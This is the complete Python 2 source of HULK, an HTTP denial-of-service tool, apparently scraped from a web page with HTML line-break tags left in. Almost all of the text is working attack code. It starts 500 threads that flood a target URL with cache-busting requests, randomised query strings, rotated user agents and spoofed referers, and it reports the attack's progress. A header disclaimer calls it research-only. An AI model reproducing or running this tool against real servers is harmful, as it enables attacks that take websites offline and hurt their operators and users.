# ----------------------------------------------------------------------------------------------<br />
# HULK - HTTP Unbearable Load King<br />
#<br />
# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them<br />
# to their knees by exhausting the resource pool, its is meant for research purposes only<br />
# and any malicious usage of this tool is prohibited.<br />
#<br />
# author : &nbsp;Barry Shteiman , version 1.0<br />
# ----------------------------------------------------------------------------------------------<br />
import urllib2<br />
import sys<br />
import threading<br />
import random<br />
import re<br />
<br />
#global params<br />
url=''<br />
host=''<br />
headers_useragents=[]<br />
headers_referers=[]<br />
request_counter=0<br />
flag=0<br />
safe=0<br />
<br />
def inc_counter():<br />
global request_counter<br />
request_counter+=1<br />
<br />
def set_flag(val):<br />
global flag<br />
flag=val<br />
<br />
def set_safe():<br />
global safe<br />
safe=1<br />
<br />
# generates a user agent array<br />
def useragent_list():<br />
global headers_useragents<br />
headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')<br />
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')<br />
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')<br />
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')<br />
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')<br />
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')<br />
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')<br />
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')<br />
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')<br />
headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')<br />
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')<br />
headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')<br />
return(headers_useragents)<br />
<br />
# generates a referer array<br />
def referer_list():<br />
global headers_referers<br />
headers_referers.append('http://www.google.com/?q=')<br />
headers_referers.append('http://www.usatoday.com/search/results?q=')<br />
headers_referers.append('http://engadget.search.aol.com/search?q=')<br />
headers_referers.append('http://' + host + '/')<br />
return(headers_referers)<br />
<br />
#builds random ascii string<br />
def buildblock(size):<br />
out_str = ''<br />
for i in range(0, size):<br />
a = random.randint(65, 90)<br />
out_str += chr(a)<br />
return(out_str)<br />
<br />
def usage():<br />
print '---------------------------------------------------'<br />
print 'USAGE: python hulk.py &lt;url&gt;'<br />
print 'you can add "safe" after url, to autoshut after dos'<br />
print '---------------------------------------------------'<br />
<br />
<br />
#http request<br />
def httpcall(url):<br />
useragent_list()<br />
referer_list()<br />
code=0<br />
if url.count("?")&gt;0:<br />
param_joiner="&amp;"<br />
else:<br />
param_joiner="?"<br />
request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))<br />
request.add_header('User-Agent', random.choice(headers_useragents))<br />
request.add_header('Cache-Control', 'no-cache')<br />
request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')<br />
request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))<br />
request.add_header('Keep-Alive', random.randint(110,120))<br />
request.add_header('Connection', 'keep-alive')<br />
request.add_header('Host',host)<br />
try:<br />
urllib2.urlopen(request)<br />
except urllib2.HTTPError, e:<br />
#print e.code<br />
set_flag(1)<br />
print 'Response Code 500'<br />
code=500<br />
except urllib2.URLError, e:<br />
#print e.reason<br />
sys.exit()<br />
else:<br />
inc_counter()<br />
urllib2.urlopen(request)<br />
return(code) <br />
<br />
<br />
#http caller thread&nbsp;<br />
class HTTPThread(threading.Thread):<br />
def run(self):<br />
try:<br />
while flag&lt;2:<br />
code=httpcall(url)<br />
if (code==500) &amp; (safe==1):<br />
set_flag(2)<br />
except Exception, ex:<br />
pass<br />
<br />
# monitors http threads and counts requests<br />
class MonitorThread(threading.Thread):<br />
def run(self):<br />
previous=request_counter<br />
while flag==0:<br />
if (previous+100&lt;request_counter) &amp; (previous&lt;&gt;request_counter):<br />
print "%d Requests Sent" % (request_counter)<br />
previous=request_counter<br />
if flag==2:<br />
print "\n-- HULK Attack Finished --"<br />
<br />
#execute&nbsp;<br />
if len(sys.argv) &lt; 2:<br />
usage()<br />
sys.exit()<br />
else:<br />
if sys.argv[1]=="help":<br />
usage()<br />
sys.exit()<br />
else:<br />
print "-- HULK Attack Started --"<br />
if len(sys.argv)== 3:<br />
if sys.argv[2]=="safe":<br />
set_safe()<br />
url = sys.argv[1]<br />
if url.count("/")==2:<br />
url = url + "/"<br />
m = re.search('http\://([^/]*)/?.*', url)<br />
host = m.group(1)<br />
for i in range(500):<br />
t = HTTPThread()<br />
t.start()<br />
t = MonitorThread()<br />
t.start()<br />